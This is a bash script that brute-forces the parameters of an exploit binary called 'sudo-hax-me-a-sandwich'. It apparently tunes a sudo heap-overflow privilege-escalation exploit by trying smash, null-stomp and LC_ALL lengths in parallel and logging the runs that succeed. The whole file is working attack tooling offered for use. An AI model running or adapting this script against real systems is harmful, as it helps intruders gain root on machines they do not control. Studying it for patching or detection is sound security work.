#!/bin/bash

try_brute() {
    IDX=`echo "$1" | awk -F ':' '{ print $1 }'`
    ALEN=`echo "$1" | awk -F ':' '{ print $2 }'`
    BLEN=`echo "$1" | awk -F ':' '{ print $3 }'`
    NLEN=`echo "$1" | awk -F ':' '{ print $4 }'`
    LCLEN=`echo "$1" | awk -F ':' '{ print $5 }'`
    OFN=out/`printf "%08d" $IDX`.txt

    (
        timeout 2 stdbuf -oL ./sudo-hax-me-a-sandwich $ALEN $BLEN $NLEN $LCLEN 2>&1
    ) > $OFN

    R="`grep -B999 bl1ng $OFN`"

    if [ "$R" == "" ]; then
        echo "NOPE"
    else
        echo "==================" >> success.txt
        grep -B999 bl1ng $OFN >> success.txt
    fi

    rm -f "${OFN}"
}

if [ "$#" == "1" ]; then
    N=`echo "$1" | awk -F ':' '{ print NF }'`
    if [ "$N" == 5 ]; then
        try_brute "$1"
        exit 0
    fi
fi

if [ "$#" != "6" ]; then
    echo "usage: $0 <smash_min> <smash_max> <null_min> <null_max> <lc_min> <lc_max>"
    exit 0
fi

if ! [ -x "$(command -v parallel)" ]; then
    echo "error: gnu parallel not found"
    exit 1
fi

smash_min=$1
smash_max=$2
null_min=$3
null_max=$4
lc_min=$5
lc_max=$6

echo "[+] cleaning up.."
rm -rf possib
rm -rf success.txt
touch success.txt
mkdir out 2>/dev/null
# people are likely to forget this
make brute 2>/dev/null

# generate permutations
echo "[+] generating possibilities.."
i=0
for smash_len in `seq $smash_min $smash_max`; do
for null_stomp_len in `seq $null_min $null_max`; do
for lc_all_len in `seq $lc_min 10 $lc_max`; do
    if [ "$[$smash_len % 2]" == "1" ]; then
        alen=$[($smash_len-1)/2]
        blen=$[$alen + 1]
    else
        alen=$[$smash_len/2]
        blen=$alen
    fi

    echo "$i:${alen}:${blen}:${null_stomp_len}:${lc_all_len}" >> possib
    i=$[$i+1]
done
done
done

# start bruting
echo "[+] lets go.."
parallel -j +`nproc` --eta $0 < possib

echo "[+] done"
if [ "`cat success.txt|wc -l`" == "0" ]; then
    echo "[-] we didnt find any working candidates :("
else
    echo "[+] we found some goodies (saved in success.txt):"
    cat success.txt
fi
